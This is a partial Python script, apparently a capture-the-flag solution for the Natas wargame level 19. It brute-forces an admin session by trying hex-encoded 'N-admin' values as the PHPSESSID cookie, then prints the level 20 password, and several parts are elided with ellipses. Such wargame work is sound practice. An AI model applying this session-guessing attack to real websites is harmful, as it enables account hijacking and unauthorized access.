...
def fuzz(url, user, password, session, proxies=None):
    for i in range(1, 640):
        string = f"{i}-admin"
        hexencoded = string.encode().hex()
        cookie = {"PHPSESSID": hexencoded}
...
def getpass(url, user, password, session, cookie, proxies=None):
    ...
    print(f"[+] The password of natas20 is: {passwd[1]}")


def main():
    # Parse command-line arguments
    parser = argparse.ArgumentParser(description="Grabs the password of natas20 by fuzzing for the admin cookie.")
    parser.add_argument('-p', '--password', help='Password of natas19.', required=True, metavar='Password')
